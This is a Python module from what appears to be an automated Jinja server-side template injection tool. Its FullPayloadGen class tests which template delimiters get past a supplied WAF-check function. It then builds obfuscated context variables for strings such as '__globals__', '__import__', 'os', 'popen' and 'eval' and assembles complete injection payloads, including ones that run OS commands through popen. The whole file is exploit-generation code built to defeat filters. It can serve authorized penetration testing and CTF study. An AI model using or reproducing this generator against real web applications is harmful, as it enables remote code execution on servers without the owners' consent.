"""完整payload的生成器，生成包括双花括号在内的所有部分

"""

import logging
import random
import string
from typing import Callable, Tuple, Union, Dict, Any

from . import payload_gen
from .colorize import colored
from .context_vars import (
    context_payloads_all,
    filter_by_used_context,
    filter_by_waf,
    ContextVariableUtil,
)
from .const import (
    CALLBACK_PREPARE_FULLPAYLOADGEN,
    CALLBACK_GENERATE_FULLPAYLOAD,
    DETECT_MODE_ACCURATE,
    ENVIRONMENT_JINJA,
    STRING,
)

logger = logging.getLogger("full_payload_gen")


def get_outer_pattern(
    waf_func: Callable,
) -> Union[Tuple[str, bool], Tuple[None, None]]:
    """根据WAF函数获取payload最外层的结构，一般为双花括号

    Args:
        waf_func (Callable): WAF函数

    Returns:
        Union[Tuple[str, bool], Tuple[None, None]]:
            最外层的结构，以及这个结构是否会产生回显
            生成失败则返回None
    """
    outer_payloads = [
        ("{{}}", "{{PAYLOAD}}", True),
        ("{%print()%}", "{%print(PAYLOAD)%}", True),
        ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
        (
            "{%for x in ((),)%}x{%endfor%}",
            "{%for x in ((PAYLOAD),)%}x{%endfor%}",
            False,
        ),
        ("{% set x= %}", "{% set x=PAYLOAD %}", False),
    ]
    for test_payload, outer_pattern, will_print in outer_payloads:
        if waf_func(test_payload):
            return outer_pattern, will_print
        else:
            logger.warning("Test pattern %s failed", colored("blue", outer_pattern))
    logger.warning(
        "Every pattern we know is %s There is %s we can generate anything!",
        colored("red", "BANNED!", bold=True),
        colored("red", "Noway", bold=True),
    )
    return None, None


def context_payloads_to_context(
    context_payload: Dict[str, Dict[str, Any]]
) -> Dict[str, Any]:
    """将context_payload转换成context字典。

    Args:
        context_payload (Dict[str, Dict[str, Any]]): 一个存储着payload以及对应上下文的字典

    Returns:
        Dict[str, Any]: 一个字典，键是变量名，值是变量值
    """
    return {
        var_name: var_value
        for _, d in context_payload.items()
        for var_name, var_value in d.items()
    }


class FullPayloadGen:
    """接受一个waf函数并负责生成payload
    waf函数接受一个字符串并返回这个字符串是否可以通过WAF
    payload由两部分组成：
        - 前方提供变量等上下文的上下文payload（一般为{%set xxx=xxx%}的形式）
        - 以及后方实际发挥作用的作用payload（一般被双花括号{{}}包裹）
    """

    def __init__(
        self,
        waf_func: Callable[
            [
                str,
            ],
            bool,
        ],
        callback: Union[Callable[[str, Dict], None], None] = None,
        detect_mode: str = DETECT_MODE_ACCURATE,
        environment: str = ENVIRONMENT_JINJA,
        waf_expr_func: Union[
            Callable[
                [
                    str,
                ],
                bool,
            ],
            None,
        ] = None,
    ):
        self.waf_func = waf_func
        self.prepared = False
        self.extra_context_vars_prepared = False
        self._callback: Callable[[str, Dict], None] = (
            callback if callback else (lambda x, y: None)
        )
        self.context_vars = ContextVariableUtil(waf_func, context_payloads_all)
        self.outer_pattern, self.will_print = None, None
        self.payload_gen = None
        self.detect_mode = detect_mode
        self.environment = environment
        self.waf_expr_func = waf_expr_func

    @property
    def callback(self):
        """Callback函数，在进行某些步骤是会被调用以传递运行时的信息

        Returns:
            Callable: callback函数
        """
        return self._callback

    @callback.setter
    def callback(self, callback):
        self._callback = callback
        if self.payload_gen:
            self.payload_gen.callback = callback

    def do_prepare(self) -> bool:
        """准备作用payload的最外层（一般为双花括号{{}}），过滤所有可用的payload

        Returns:
            bool: 是否生成成功，失败则无法生成payload。
        """
        if self.prepared:
            return True

        self.context_vars.do_prepare()

        self.outer_pattern, self.will_print = get_outer_pattern(self.waf_func)
        if not self.outer_pattern:
            return False
        if self.will_print:
            logger.info("use %s", colored("blue", self.outer_pattern))
        else:
            logger.warning(
                "use %s, which %s your result!",
                colored("blue", self.outer_pattern),
                colored("red", "will not print"),
            )

        self.payload_gen = payload_gen.PayloadGenerator(
            self.waf_func,
            self.context_vars.get_context(),
            self.callback,
            detect_mode=self.detect_mode,
            environment=self.environment,
            waf_expr_func=self.waf_expr_func,
        )
        self.prepared = True
        self.callback(
            CALLBACK_PREPARE_FULLPAYLOADGEN,
            {
                "context": self.context_vars.get_context(),
                "outer_pattern": self.outer_pattern,
                "will_print": self.will_print,
            },
        )
        return True

    def prepare_extra_context_vars(self):
        targets = [
            "__class__",
            "__globals__",
            "__builtins__",
            "__getitem__",
            "__import__",
            "__getitem__",
            "__add__",
            "__mul__",
            "__mod__",
            "__truediv__",
            "os",
            "popen",
            "read",
            "pop",
            "get",
            "eval",
            "chr",
            "%c",
        ]
        if not self.prepared and not self.do_prepare():
            return
        if not self.waf_func("{%set %}"):
            return
        if self.extra_context_vars_prepared:
            return
        self.extra_context_vars_prepared = True

        assert self.payload_gen is not None, "when prepared, we should have payload_gen"
        logger.info(
            "Adding some string variables...",
        )
        for target in targets:
            ret = self.payload_gen.generate_detailed(STRING, target)
            if ret is None:
                continue
            expression, used_context, _ = ret
            # get a valid variable name
            var_name = None
            for _ in range(10):
                name = "".join(random.choices(string.ascii_lowercase, k=4))
                if self.context_vars.is_variable_exists(name):
                    continue
                if not self.waf_func(name):
                    continue
                var_name = name
            if not var_name:
                continue
            # add payload
            payload = "{%set NAME=EXPR%}".replace("NAME", name).replace(
                "EXPR", expression
            )
            success = self.add_context_variable(
                payload, {name: target}, check_waf=True, depends_on=used_context
            )
            if not success:
                logger.info("Failed generating %s", colored("yellow", repr(target)))
                continue
            # add used context
            # finish
            logger.info(
                "Adding %s with %s",
                colored("yellow", repr(target)),
                colored("blue", payload),
            )
        self.payload_gen.cache_by_repr.clear()

    def add_context_variable(
        self,
        payload: str,
        context_vars: Dict[str, Any],
        check_waf: bool = True,
        depends_on: Union[Dict[str, Any], None] = None,
    ) -> bool:
        if not self.prepared:
            raise RuntimeError("Please run .do_prepare() first")
        success = self.context_vars.add_payload(
            payload=payload,
            variables=context_vars,
            depends_on=depends_on,
            check_waf=check_waf,
        )
        if not success:
            return False
        self.payload_gen.context = self.context_vars.get_context()
        return True

    def generate_with_tree(
        self, gen_type, *args
    ) -> Union[Tuple[str, bool, payload_gen.TargetAndSubTargets], None]:
        """根据要求生成payload

        Args:
            gen_type (str): 生成payload的类型，应传入如OS_POPEN_READ等在const.py中定义的类型

        Returns:
            Tuple[Union[str, None], Union[bool, None]]:
                payload, 以及payload是否会有回显
        """
        if not self.prepared and not self.do_prepare():
            return None
        assert self.payload_gen is not None, "when prepared, we should have payload_gen"

        self.prepare_extra_context_vars()
        logger.info("Start generating final expression...")

        ret = self.payload_gen.generate_detailed(gen_type, *args)

        if ret is None:
            logger.warning("Bypassing WAF Failed.")
            return None
        inner_payload, used_context, tree = ret
        context_payload = self.context_vars.get_payload(used_context)
        assert isinstance(self.outer_pattern, str)

        payload = context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)

        self.callback(
            CALLBACK_GENERATE_FULLPAYLOAD,
            {
                "gen_type": gen_type,
                "args": args,
                "payload": payload,
                "will_print": self.will_print,
            },
        )
        if not self.will_print:
            logger.warning(
                "use %s, which %s your result!",
                colored("blue", self.outer_pattern),
                colored("red", "will not print"),
            )
        return (payload, self.will_print, tree)

    def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
        """根据要求生成payload

        Args:
            gen_type (str): 生成payload的类型，应传入如OS_POPEN_READ等在const.py中定义的类型

        Returns:
            Tuple[Union[str, None], Union[bool, None]]:
                payload, 以及payload是否会有回显
        """
        result = self.generate_with_tree(gen_type, *args)
        if result:
            return result[:2]
        return None, None
